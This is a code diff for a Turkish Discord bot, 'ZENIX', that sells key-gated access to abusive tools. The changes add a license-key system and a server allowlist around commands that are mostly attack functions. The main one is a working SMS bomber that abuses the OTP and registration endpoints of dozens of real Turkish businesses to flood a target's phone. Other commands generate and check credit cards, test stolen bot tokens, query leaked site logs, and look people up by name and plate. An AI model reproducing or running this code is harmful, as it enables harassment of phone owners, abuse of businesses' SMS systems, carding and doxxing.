@@ -6,6 +6,7 @@ import asyncio
 import datetime
 import threading
 import time
+import secrets
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from typing import Optional
 from urllib.parse import urlencode
@@ -53,6 +54,10 @@ except ImportError:
 DISCORD_TOKEN = os.getenv("DISCORD_TOKEN", "")
 SEARCH_KEY    = os.getenv("SEARCH_API_KEY", "91e2c5dfa0de4a22e2afbe5b")
 
+# ==================== SABİT ID'LER ====================
+ADMIN_ID = 1538810452308533308
+MAIN_GUILD_ID = 1546912458793287725
+
 WAZELY       = "https://wazely.vercel.app/api"
 WAZELY_API   = "https://wazelyapi.vercel.app/api"
 SOLIDARK     = "https://solidarksystems.alwaysdata.net"
@@ -68,7 +73,69 @@ COLOR_OK   = 0x10b981
 COLOR_ERR  = 0xe11d48
 COLOR_Z    = 0x8b5cf6
 
-# ==================== FİLTRE KURALLARI ====================
+# ==================== JSON VERİTABANI ====================
+DB_FILE = "zenix_data.json"
+
+def load_db():
+    if not os.path.exists(DB_FILE):
+        return {
+            "keys": {},         # {"key": {"user_id":..., "created_at":...}}
+            "user_keys": {},    # {"user_id": "key"}
+            "guilds": [MAIN_GUILD_ID],   # izin verilen sunucular
+        }
+    try:
+        with open(DB_FILE, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        # Migration
+        data.setdefault("keys", {})
+        data.setdefault("user_keys", {})
+        data.setdefault("guilds", [MAIN_GUILD_ID])
+        if MAIN_GUILD_ID not in data["guilds"]:
+            data["guilds"].append(MAIN_GUILD_ID)
+        return data
+    except Exception:
+        return {"keys": {}, "user_keys": {}, "guilds": [MAIN_GUILD_ID]}
+
+def save_db():
+    try:
+        with open(DB_FILE, "w", encoding="utf-8") as f:
+            json.dump(DB, f, ensure_ascii=False, indent=2)
+    except Exception as e:
+        print(f"❌ DB save hatası: {e}")
+
+DB = load_db()
+
+
+# ==================== ANAHTAR YARDIMCILARI ====================
+def generate_key():
+    """ZENIX-XXXX-XXXX-XXXX formatında anahtar üretir."""
+    part = lambda: secrets.token_hex(2).upper()
+    return f"ZENIX-{part()}-{part()}-{part()}"
+
+def user_has_key(user_id: int) -> bool:
+    return str(user_id) in DB["user_keys"]
+
+def get_user_key(user_id: int) -> Optional[str]:
+    return DB["user_keys"].get(str(user_id))
+
+def register_key(user_id: int, key: str):
+    DB["keys"][key] = {
+        "user_id": user_id,
+        "created_at": datetime.datetime.utcnow().isoformat()
+    }
+    DB["user_keys"][str(user_id)] = key
+    save_db()
+
+def is_allowed_guild(guild_id: Optional[int]) -> bool:
+    if guild_id is None:
+        return False
+    return guild_id in DB["guilds"]
+
+def is_admin(user_id: int) -> bool:
+    return user_id == ADMIN_ID
+
+
+# ==================== FİLTRE ====================
 BLOCKED_PATTERNS = [
     "arastirguncel", "iptal edilmiştir", "iptal edilmistir",
     "lutfen telegram", "lütfen telegram", "kanalimiza tekrar",
@@ -91,6 +158,8 @@ STRIP_KEYS = {
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
+intents.guilds = True
+
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 
@@ -207,7 +276,8 @@ def build_welcome_embed() -> discord.Embed:
             "⚡  Hızlı ve güvenilir sonuçlar\n"
             "🎯  Tek komutla her şeye erişim\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "**Başlamak için:** `/yardim`"
+            "🔑  **Anahtar almak için:** `/anahtargir`\n"
+            "📖  **Komutlar için:** `/yardim`"
         ),
         color=COLOR_Z,
         timestamp=datetime.datetime.utcnow()
@@ -217,14 +287,50 @@ def build_welcome_embed() -> discord.Embed:
     return embed
 
 
+# ==================== KOMUT ÖN KONTROL ====================
+async def precheck(interaction: discord.Interaction) -> bool:
+    """
+    Her komut çalışmadan önce kontrol eder:
+    - DM'de mi? (evet → reddet)
+    - Sunucu izinli mi?
+    - Kullanıcı anahtarlı mı?
+    """
+    # 1) DM kontrolü
+    if interaction.guild is None:
+        await interaction.response.send_message(
+            "❌ **DM'den komut kullanamazsın.** Lütfen sunucuda kullan.",
+            ephemeral=True
+        )
+        return False
+
+    # 2) Sunucu kontrolü
+    if not is_allowed_guild(interaction.guild.id):
+        await interaction.response.send_message(
+            "❌ **Bu sunucuda kullanım izni yok.**",
+            ephemeral=True
+        )
+        return False
+
+    # 3) Anahtar kontrolü (admin muaf)
+    if not is_admin(interaction.user.id) and not user_has_key(interaction.user.id):
+        await interaction.response.send_message(
+            "🔑 **Anahtar gerekli!**\n"
+            "Komutları kullanmak için önce `/anahtargir` ile anahtarını gir.",
+            ephemeral=True
+        )
+        return False
+
+    return True
+
+
 # ==================== SMS BOMBER ====================
 class SmsBomber:
-    """Her instance kendine özel servis listesi tutar."""
-
     def __init__(self, phone: str, mail: str = ""):
-        self.phone = str(phone).lstrip("0").lstrip("+90").lstrip("90")
+        self.phone = str(phone).lstrip("0")
         if self.phone.startswith("90") and len(self.phone) == 12:
             self.phone = self.phone[2:]
+        if self.phone.startswith("+90"):
+            self.phone = self.phone[3:]
         self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"
         self.tc = self._gen_tc()
         self.results = []
@@ -240,8 +346,7 @@ class SmsBomber:
     def _add(self, name: str, ok: bool):
         self.results.append((name, ok))
 
-    # ==================== SERVİSLER (52 adet) ====================
-
+    # --- 34 SERVİS ---
     def kahvedunyasi(self):
         try:
             r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
@@ -274,7 +379,7 @@ class SmsBomber:
     def suiste(self):
         try:
             r = requests.post("https://suiste.com/api/auth/code",
-                headers={"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "X-Mobillium-App-Build-Number": "1469", "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1", "X-Mobillium-Os-Version": "15.8.3", "X-Mobillium-App-Version": "1.7.11"},
+                headers={"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "X-Mobillium-App-Build-Number": "1469", "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1"},
                 data={"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}, timeout=6)
             self._add("suiste.com", r.json().get("code") == "common.success")
         except: self._add("suiste.com", False)
@@ -344,7 +449,7 @@ class SmsBomber:
     def metro(self):
         try:
             r = requests.post("https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",
-                headers={"Content-Type": "application/json; charset=utf-8", "Applicationversion": "2.4.1", "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1"},
+                headers={"Content-Type": "application/json; charset=utf-8", "Applicationversion": "2.4.1", "User-Agent": "Metro Turkiye/2.4.1"},
                 json={"methodType": "2", "mobilePhoneNumber": self.phone}, timeout=6)
             self._add("metro-tr.com", r.json().get("status") == "success")
         except: self._add("metro-tr.com", False)
@@ -408,7 +513,7 @@ class SmsBomber:
     def yapp(self):
         try:
             r = requests.post("https://yapp.com.tr/api/mobile/v1/register",
-                headers={"Content-Type": "application/json", "X-Content-Language": "en", "User-Agent": "YappApp/1.1.5"},
+                headers={"Content-Type": "application/json", "User-Agent": "YappApp/1.1.5"},
                 json={"app_version": "1.1.5", "code": "tr", "device_model": "iPhone8,5", "device_name": "Memati", "device_type": "I", "device_version": "15.8.3", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}, timeout=6)
             self._add("yapp.com.tr", r.status_code == 200)
         except: self._add("yapp.com.tr", False)
@@ -425,7 +530,7 @@ class SmsBomber:
     def dominos(self):
         try:
             r = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode",
-                headers={"Content-Type": "application/json;charset=utf-8", "Appversion": "IOS-7.1.0", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0"},
+                headers={"Content-Type": "application/json;charset=utf-8", "Appversion": "IOS-7.1.0", "User-Agent": "Dominos/7.1.0"},
                 json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}, timeout=6)
             self._add("dominos.com.tr", r.json().get("isSuccess") == True)
         except: self._add("dominos.com.tr", False)
@@ -508,9 +613,7 @@ class SmsBomber:
             self._add("ido.com.tr", r.status_code == 200)
         except: self._add("ido.com.tr", False)
 
-    # ==================== ÇALIŞTIRMA ====================
     def get_services(self):
-        """Sınıftaki tüm servis metodlarını döner."""
         return [
             self.kahvedunyasi, self.wmf, self.bim, self.englishhome, self.suiste,
             self.kimgb, self.evidea, self.ucdortbes, self.tiklagelsin, self.naosstars,
@@ -522,21 +625,16 @@ class SmsBomber:
         ]
 
     def run_normal(self, adet: int = 1):
-        """Normal mod: Servisleri sırayla çalıştırır. Her servisten `adet` kadar SMS gönderir."""
         services = self.get_services()
         for _ in range(adet):
             for svc in services:
-                try:
-                    svc()
-                except Exception:
-                    pass
+                try: svc()
+                except: pass
 
     async def run_normal_async(self, adet: int = 1):
-        """Normal mod - async wrapper (thread pool)."""
         await asyncio.to_thread(self.run_normal, adet)
 
     async def run_turbo(self, adet: int = 1):
-        """Turbo mod: Tüm servisleri paralel çalıştırır."""
         services = self.get_services()
         for _ in range(adet):
             tasks = [asyncio.to_thread(svc) for svc in services]
@@ -548,6 +646,7 @@ class SmsBomber:
 async def on_ready():
     print(f"✅ ZENIX aktif: {bot.user}")
     print(f"🌐 {len(bot.guilds)} sunucuda çalışıyor")
+    print(f"🏠 İzinli sunucular: {DB['guilds']}")
     try:
         synced = await bot.tree.sync()
         print(f"🔁 {len(synced)} komut yüklendi.")
@@ -560,6 +659,8 @@ async def on_ready():
 
 @bot.event
 async def on_member_join(member: discord.Member):
+    if not is_allowed_guild(member.guild.id):
+        return
     channel = None
     for ch in member.guild.text_channels:
         if ch.permissions_for(member.guild.me).send_messages:
@@ -572,6 +673,223 @@ async def on_member_join(member: discord.Member):
             pass
 
 
+# ==================== ANAHTAR KOMUTLARI ====================
+@bot.tree.command(name="anahtargir", description="ZENIX anahtarını gir")
+@app_commands.describe(anahtar="Sana verilen anahtar (ZENIX-XXXX-XXXX-XXXX)")
+async def anahtargir(interaction: discord.Interaction, anahtar: str):
+    # DM kontrolü
+    if interaction.guild is None:
+        await interaction.response.send_message("❌ Sunucuda kullan.", ephemeral=True)
+        return
+    if not is_allowed_guild(interaction.guild.id):
+        await interaction.response.send_message("❌ Bu sunucuda kullanım izni yok.", ephemeral=True)
+        return
+
+    anahtar = anahtar.strip().upper()
+
+    # Kullanıcı zaten anahtarlı mı?
+    if user_has_key(interaction.user.id):
+        await interaction.response.send_message(
+            f"✅ Zaten bir anahtarın var: `{get_user_key(interaction.user.id)}`",
+            ephemeral=True
+        )
+        return
+
+    # Anahtar DB'de var mı?
+    if anahtar not in DB["keys"]:
+        await interaction.response.send_message(
+            "❌ **Geçersiz anahtar.**",
+            ephemeral=True
+        )
+        return
+
+    # Anahtar başkası tarafından mı kullanılmış?
+    key_info = DB["keys"][anahtar]
+    if key_info.get("user_id") and key_info["user_id"] != interaction.user.id:
+        await interaction.response.send_message(
+            "❌ Bu anahtar başka bir kullanıcıya ait.",
+            ephemeral=True
+        )
+        return
+
+    # Kaydet
+    register_key(interaction.user.id, anahtar)
+
+    embed = discord.Embed(
+        title="✅ Anahtar Aktif",
+        description=f"Hoş geldin {interaction.user.mention}!\nArtık tüm komutları kullanabilirsin.",
+        color=COLOR_OK,
+        timestamp=datetime.datetime.utcnow()
+    )
+    embed.add_field(name="🔑 Anahtarın", value=f"`{anahtar}`", inline=False)
+    embed.set_thumbnail(url=LOGO_URL)
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+
+@bot.tree.command(name="anahtarolustur", description="[ADMIN] Yeni anahtar oluşturur")
+@app_commands.describe(kullanici="Anahtarı vereceğin kullanıcı")
+async def anahtarolustur(interaction: discord.Interaction, kullanici: discord.Member):
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Bu komut sadece admin içindir.", ephemeral=True)
+        return
+
+    new_key = generate_key()
+    while new_key in DB["keys"]:
+        new_key = generate_key()
+
+    DB["keys"][new_key] = {"user_id": None, "created_at": datetime.datetime.utcnow().isoformat()}
+    save_db()
+
+    embed = discord.Embed(
+        title="🔑 Yeni Anahtar Oluşturuldu",
+        description=f"Kullanıcı: {kullanici.mention}",
+        color=COLOR_OK,
+        timestamp=datetime.datetime.utcnow()
+    )
+    embed.add_field(name="Anahtar", value=f"`{new_key}`", inline=False)
+    embed.add_field(name="Kullanım", value=f"`/anahtargir anahtar:{new_key}`", inline=False)
+    embed.set_thumbnail(url=LOGO_URL)
+
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+    try:
+        await kullanici.send(f"🔑 **ZENIX Anahtarın:** `{new_key}`\nSunucuda `/anahtargir` ile aktif et.")
+    except Exception:
+        pass
+
+
+@bot.tree.command(name="anahtarsil", description="[ADMIN] Kullanıcının anahtarını siler")
+@app_commands.describe(kullanici="Anahtarı silinecek kullanıcı")
+async def anahtarsil(interaction: discord.Interaction, kullanici: discord.Member):
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin değilsin.", ephemeral=True)
+        return
+
+    uid = str(kullanici.id)
+    if uid not in DB["user_keys"]:
+        await interaction.response.send_message("❌ Bu kullanıcının anahtarı yok.", ephemeral=True)
+        return
+
+    key = DB["user_keys"].pop(uid)
+    if key in DB["keys"]:
+        DB["keys"].pop(key)
+    save_db()
+
+    await interaction.response.send_message(f"✅ {kullanici.mention} anahtarı silindi.", ephemeral=True)
+
+
+@bot.tree.command(name="anahtarlistesi", description="[ADMIN] Tüm anahtarları listeler")
+async def anahtarlistesi(interaction: discord.Interaction):
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin değilsin.", ephemeral=True)
+        return
+
+    if not DB["keys"]:
+        await interaction.response.send_message("📭 Hiç anahtar yok.", ephemeral=True)
+        return
+
+    lines = []
+    for k, v in DB["keys"].items():
+        uid = v.get("user_id")
+        if uid:
+            lines.append(f"✅ `{k}` → <@{uid}>")
+        else:
+            lines.append(f"🆓 `{k}` → (boşta)")
+
+    text = "\n".join(lines)
+    if len(text) > 1900:
+        text = text[:1900] + "\n..."
+
+    embed = discord.Embed(
+        title=f"🔑 Anahtar Listesi ({len(DB['keys'])})",
+        description=text,
+        color=COLOR_Z
+    )
+    embed.set_thumbnail(url=LOGO_URL)
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+
+# ==================== SUNUCUEKLE ====================
+@bot.tree.command(name="sunucuekle", description="[ADMIN] Yeni sunucu ekler ve davet linki verir")
+@app_commands.describe(sunucu_id="Eklenecek sunucunun ID'si")
+async def sunucuekle(interaction: discord.Interaction, sunucu_id: str):
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin değilsin.", ephemeral=True)
+        return
+
+    try:
+        gid = int(sunucu_id.strip())
+    except ValueError:
+        await interaction.response.send_message("❌ Geçersiz sunucu ID.", ephemeral=True)
+        return
+
+    if gid in DB["guilds"]:
+        await interaction.response.send_message(f"ℹ️ Bu sunucu zaten ekli: `{gid}`", ephemeral=True)
+        return
+
+    DB["guilds"].append(gid)
+    save_db()
+
+    # Davet linki oluştur
+    invite_url = discord.utils.oauth_url(
+        bot.user.id,
+        permissions=discord.Permissions(administrator=True),
+        scopes=("bot", "applications.commands"),
+        guild=discord.Object(id=gid)
+    )
+
+    embed = discord.Embed(
+        title="✅ Sunucu Eklendi",
+        description=f"`{gid}` artık izinli sunucular listesinde.",
+        color=COLOR_OK
+    )
+    embed.add_field(name="🔗 Davet Linki", value=f"[Tıkla]({invite_url})", inline=False)
+    embed.add_field(name="📋 Alternatif", value=f"```\n{invite_url}\n```", inline=False)
+    embed.set_thumbnail(url=LOGO_URL)
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+
+@bot.tree.command(name="sunuculistesi", description="[ADMIN] İzinli sunucuları listeler")
+async def sunuculistesi(interaction: discord.Interaction):
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin değilsin.", ephemeral=True)
+        return
+
+    lines = [f"• `{g}`" for g in DB["guilds"]]
+    embed = discord.Embed(
+        title=f"🏠 İzinli Sunucular ({len(DB['guilds'])})",
+        description="\n".join(lines),
+        color=COLOR_Z
+    )
+    embed.set_thumbnail(url=LOGO_URL)
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+
+@bot.tree.command(name="sunucusil", description="[ADMIN] Sunucuyu izinli listeden çıkarır")
+@app_commands.describe(sunucu_id="Silinecek sunucu ID")
+async def sunucusil(interaction: discord.Interaction, sunucu_id: str):
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin değilsin.", ephemeral=True)
+        return
+
+    try:
+        gid = int(sunucu_id.strip())
+    except ValueError:
+        await interaction.response.send_message("❌ Geçersiz ID.", ephemeral=True)
+        return
+
+    if gid == MAIN_GUILD_ID:
+        await interaction.response.send_message("❌ Ana sunucu silinemez.", ephemeral=True)
+        return
+
+    if gid not in DB["guilds"]:
+        await interaction.response.send_message("❌ Bu sunucu listede yok.", ephemeral=True)
+        return
+
+    DB["guilds"].remove(gid)
+    save_db()
+    await interaction.response.send_message(f"✅ `{gid}` listeden çıkarıldı.", ephemeral=True)
+
+
 # ==================== GRUPLAR ====================
 zenix_group  = app_commands.Group(name="zenix",  description="ZENIX - Genel Sorgular")
 zenix2_group = app_commands.Group(name="zenix2", description="ZENIX - TC & Kimlik Sorguları")
@@ -582,6 +900,7 @@ zenix3_group = app_commands.Group(name="zenix3", description="ZENIX - Ad/Soyad &
 @zenix_group.command(name="bedrock", description="Minecraft Bedrock sunucu durumu")
 @app_commands.describe(adres="Sunucu adresi")
 async def z_bedrock(interaction: discord.Interaction, adres: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{WAZELY_API}/bedrock?adres={adres}")
     await send_result(interaction, data)
@@ -589,6 +908,7 @@ async def z_bedrock(interaction: discord.Interaction, adres: str):
 
 @zenix_group.command(name="ccgen", description="Rastgele kart üretir")
 async def z_ccgen(interaction: discord.Interaction):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{WAZELY_API}/ccgen")
     await send_result(interaction, data)
@@ -597,6 +917,7 @@ async def z_ccgen(interaction: discord.Interaction):
 @zenix_group.command(name="cccheck", description="Kart geçerlilik kontrolü")
 @app_commands.describe(data="Kart verisi")
 async def z_cccheck(interaction: discord.Interaction, data: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     res = await fetch_json(f"{WAZELY_API}/check?data={data}")
     await send_result(interaction, res)
@@ -605,6 +926,7 @@ async def z_cccheck(interaction: discord.Interaction, data: str):
 @zenix_group.command(name="dctoken", description="Discord bot token testi")
 @app_commands.describe(token="Bot token")
 async def z_dctoken(interaction: discord.Interaction, token: str):
+    if not await precheck(interaction): return
     await interaction.response.defer(ephemeral=True)
     res = await fetch_json(f"{WAZELY_API}/dcbottokencheck?token={token}")
     await send_result(interaction, res)
@@ -613,6 +935,7 @@ async def z_dctoken(interaction: discord.Interaction, token: str):
 @zenix_group.command(name="tgtoken", description="Telegram bot token testi")
 @app_commands.describe(token="Bot token")
 async def z_tgtoken(interaction: discord.Interaction, token: str):
+    if not await precheck(interaction): return
     await interaction.response.defer(ephemeral=True)
     res = await fetch_json(f"{WAZELY_API}/tgtokencheck?token={token}")
     await send_result(interaction, res)
@@ -621,6 +944,7 @@ async def z_tgtoken(interaction: discord.Interaction, token: str):
 @zenix_group.command(name="trlog", description="Türkiye log sorgusu")
 @app_commands.describe(site="Site adı")
 async def z_trlog(interaction: discord.Interaction, site: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{WAZELY}/trlog?site={site}")
     await send_result(interaction, data)
@@ -629,6 +953,7 @@ async def z_trlog(interaction: discord.Interaction, site: str):
 @zenix_group.command(name="log", description="Site log sorgusu")
 @app_commands.describe(url="Domain")
 async def z_log(interaction: discord.Interaction, url: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SOLIDARK}/log.php?url={url}")
     await send_result(interaction, data)
@@ -637,6 +962,7 @@ async def z_log(interaction: discord.Interaction, url: str):
 @zenix_group.command(name="eczane", description="Eczane sorgusu")
 @app_commands.describe(ad="Eczane adı")
 async def z_eczane(interaction: discord.Interaction, ad: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{WAZELY}/eczane?ad={ad}")
     await send_result(interaction, data)
@@ -645,6 +971,7 @@ async def z_eczane(interaction: discord.Interaction, ad: str):
 @zenix_group.command(name="ipinfo", description="IP adresi bilgisi")
 @app_commands.describe(ip="IP adresi")
 async def z_ipinfo(interaction: discord.Interaction, ip: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{WAZELY}/ipinfo?ip={ip}")
     await send_result(interaction, data)
@@ -653,6 +980,7 @@ async def z_ipinfo(interaction: discord.Interaction, ip: str):
 @zenix_group.command(name="dns", description="Domain DNS kayıtları")
 @app_commands.describe(domain="Domain")
 async def z_dns(interaction: discord.Interaction, domain: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{WAZELY}/dns?domain={domain}")
     await send_result(interaction, data)
@@ -661,6 +989,7 @@ async def z_dns(interaction: discord.Interaction, domain: str):
 @zenix_group.command(name="bahis", description="Bahis kaydı sorgusu")
 @app_commands.describe(isimsoyisim="İsim Soyisim")
 async def z_bahis(interaction: discord.Interaction, isimsoyisim: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{WAZELY}/bahis?isimsoyisim={isimsoyisim}")
     await send_result(interaction, data)
@@ -668,6 +997,7 @@ async def z_bahis(interaction: discord.Interaction, isimsoyisim: str):
 
 @zenix_group.command(name="exxengen", description="Exxen hesap oluşturucu")
 async def z_exxengen(interaction: discord.Interaction):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{WAZELY}/exxengen")
     await send_result(interaction, data)
@@ -676,6 +1006,7 @@ async def z_exxengen(interaction: discord.Interaction):
 @zenix_group.command(name="nitrogen", description="Rastgele Nitro kodları")
 @app_commands.describe(count="Adet (varsayılan: 10)")
 async def z_nitro(interaction: discord.Interaction, count: Optional[int] = 10):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{WAZELY}/fakeNitro?count={count}")
     await send_result(interaction, data)
@@ -684,6 +1015,7 @@ async def z_nitro(interaction: discord.Interaction, count: Optional[int] = 10):
 @zenix_group.command(name="pingtest", description="Ping testi")
 @app_commands.describe(target="Hedef")
 async def z_pingtest(interaction: discord.Interaction, target: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{WAZELY}/ping?target={target}")
     await send_result(interaction, data)
@@ -692,6 +1024,7 @@ async def z_pingtest(interaction: discord.Interaction, target: str):
 @zenix_group.command(name="plaka", description="Plaka sorgusu")
 @app_commands.describe(plate="Plaka")
 async def z_plaka(interaction: discord.Interaction, plate: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{WAZELY}/plaka?plate={plate}")
     await send_result(interaction, data)
@@ -699,6 +1032,7 @@ async def z_plaka(interaction: discord.Interaction, plate: str):
 
 @zenix_group.command(name="predunyam", description="Predunyam hesap oluşturucu")
 async def z_predunyam(interaction: discord.Interaction):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{WAZELY}/predunyam")
     await send_result(interaction, data)
@@ -706,30 +1040,25 @@ async def z_predunyam(interaction: discord.Interaction):
 
 @zenix_group.command(name="useragent", description="Rastgele User-Agent")
 async def z_useragent(interaction: discord.Interaction):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{WAZELY}/randomuseragent")
     await send_result(interaction, data)
 
 
-# ==================== SMS BOMBER KOMUTU ====================
+# ==================== SMS BOMBER ====================
 @zenix_group.command(name="smsbomber", description="SMS Bomber - Normal mod")
-@app_commands.describe(
-    numara="Telefon numarası (5XXXXXXXXX)",
-    adet="Kaç tur (varsayılan: 1)",
-    mail="Mail adresi (opsiyonel)",
-)
+@app_commands.describe(numara="Telefon numarası (5XXXXXXXXX)", adet="Kaç tur (varsayılan: 1)", mail="Mail (opsiyonel)")
 async def z_smsbomber(interaction: discord.Interaction, numara: str, adet: Optional[int] = 1, mail: Optional[str] = None):
+    if not await precheck(interaction): return
     await interaction.response.defer()
-    adet = max(1, min(adet, 10))  # en fazla 10 tur
+    adet = max(1, min(adet, 10))
     bomber = SmsBomber(numara, mail or "")
     start = time.time()
 
-    embed = discord.Embed(
-        title="💣 ZENIX SMS BOMBER - NORMAL MOD",
+    embed = discord.Embed(title="💣 ZENIX SMS BOMBER - NORMAL",
         description=f"📱 `{numara}` | 🔁 {adet} tur | ⏳ Çalışıyor...",
-        color=COLOR_Z,
-        timestamp=datetime.datetime.utcnow()
-    )
+        color=COLOR_Z, timestamp=datetime.datetime.utcnow())
     embed.set_thumbnail(url=LOGO_URL)
     msg = await interaction.followup.send(embed=embed)
 
@@ -739,59 +1068,42 @@ async def z_smsbomber(interaction: discord.Interaction, numara: str, adet: Optio
     ok = sum(1 for _, v in bomber.results if v)
     fail = len(bomber.results) - ok
 
-    # Servis bazında özet
     summary = {}
     for name, status in bomber.results:
-        if name not in summary:
-            summary[name] = {"ok": 0, "fail": 0}
+        summary.setdefault(name, {"ok": 0, "fail": 0})
         if status: summary[name]["ok"] += 1
         else:      summary[name]["fail"] += 1
 
-    lines = []
-    for name, st in summary.items():
-        icon = "✅" if st["ok"] > 0 else "❌"
-        lines.append(f"{icon} `{name}` → {st['ok']} başarılı / {st['fail']} başarısız")
+    lines = [f"{'✅' if s['ok']>0 else '❌'} `{n}` → {s['ok']} başarılı / {s['fail']} başarısız" for n, s in summary.items()]
+    full = "\n".join(lines)
 
-    # Embed güncelle
-    embed = discord.Embed(
-        title="💣 ZENIX SMS BOMBER - NORMAL MOD",
+    embed = discord.Embed(title="💣 ZENIX SMS BOMBER - NORMAL",
         description=f"📱 `{numara}` | 🔁 {adet} tur | ⏱️ {elapsed}s",
-        color=COLOR_OK,
-        timestamp=datetime.datetime.utcnow()
-    )
+        color=COLOR_OK, timestamp=datetime.datetime.utcnow())
     embed.add_field(name="📊 Özet", value=f"✅ Başarılı: **{ok}**\n❌ Başarısız: **{fail}**", inline=False)
     embed.set_thumbnail(url=LOGO_URL)
 
-    full = "\n".join(lines)
     if len(full) > 1000:
-        full = full[:1000] + "\n... (devamı dosyada)"
-        file = discord.File(io.BytesIO("\n".join(lines).encode("utf-8")), filename="zenix_sms_log.txt")
+        file = discord.File(io.BytesIO(full.encode("utf-8")), filename="zenix_sms.txt")
         await msg.edit(embed=embed)
         await interaction.followup.send(file=file)
     else:
-        embed.add_field(name="🔍 Servis Detayı", value=full or "Sonuç yok", inline=False)
+        embed.add_field(name="🔍 Detay", value=full or "Sonuç yok", inline=False)
         await msg.edit(embed=embed)
 
 
-# ==================== SMS TURBO ====================
 @zenix_group.command(name="turbo", description="SMS Bomber - Turbo mod (paralel)")
-@app_commands.describe(
-    numara="Telefon numarası (5XXXXXXXXX)",
-    adet="Kaç tur (varsayılan: 1)",
-    mail="Mail adresi (opsiyonel)",
-)
+@app_commands.describe(numara="Telefon numarası (5XXXXXXXXX)", adet="Kaç tur (varsayılan: 1)", mail="Mail (opsiyonel)")
 async def z_turbo(interaction: discord.Interaction, numara: str, adet: Optional[int] = 1, mail: Optional[str] = None):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     adet = max(1, min(adet, 10))
     bomber = SmsBomber(numara, mail or "")
     start = time.time()
 
-    embed = discord.Embed(
-        title="🚀 ZENIX SMS BOMBER - TURBO MOD",
-        description=f"📱 `{numara}` | 🔁 {adet} tur | ⚡ Paralel çalışıyor...",
-        color=COLOR_Z,
-        timestamp=datetime.datetime.utcnow()
-    )
+    embed = discord.Embed(title="🚀 ZENIX SMS BOMBER - TURBO",
+        description=f"📱 `{numara}` | 🔁 {adet} tur | ⚡ Paralel...",
+        color=COLOR_Z, timestamp=datetime.datetime.utcnow())
     embed.set_thumbnail(url=LOGO_URL)
     msg = await interaction.followup.send(embed=embed)
 
@@ -803,39 +1115,31 @@ async def z_turbo(interaction: discord.Interaction, numara: str, adet: Optional[
 
     summary = {}
     for name, status in bomber.results:
-        if name not in summary:
-            summary[name] = {"ok": 0, "fail": 0}
+        summary.setdefault(name, {"ok": 0, "fail": 0})
         if status: summary[name]["ok"] += 1
         else:      summary[name]["fail"] += 1
 
-    lines = []
-    for name, st in summary.items():
-        icon = "✅" if st["ok"] > 0 else "❌"
-        lines.append(f"{icon} `{name}` → {st['ok']} başarılı / {st['fail']} başarısız")
+    lines = [f"{'✅' if s['ok']>0 else '❌'} `{n}` → {s['ok']} başarılı / {s['fail']} başarısız" for n, s in summary.items()]
